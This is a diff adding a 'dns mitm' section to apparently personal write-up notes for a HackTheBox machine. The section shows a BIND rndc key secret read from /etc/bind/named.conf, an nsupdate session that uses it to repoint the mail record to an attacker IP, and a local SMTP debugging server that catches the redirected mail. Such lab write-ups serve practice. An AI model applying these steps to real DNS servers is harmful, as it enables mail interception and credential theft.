@@ -146,6 +146,33 @@ https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
 dig command syntaxt snoopy.htb @<snoopy actual ip>
 `dig axfr snoopy.htb @10.10.11.212`
 
+### dns mitm
+
+dns mitm is possible if you manafe to get the dns key from
+
+/etc/bind/named.conf
+
+```
+
+key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};
+```
+
+```
+nsupdate -d -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
+Creating key...
+namefromtext
+keycreate
+> server snoopy.htb
+> update add mail.snoopy.htb 86400 IN A 10.10.16.47
+> send
+```
+
+python -m smtpd -c DebuggingServer -n 127.0.0.1:25
+
+
 
 ### LFI vulnerability
 
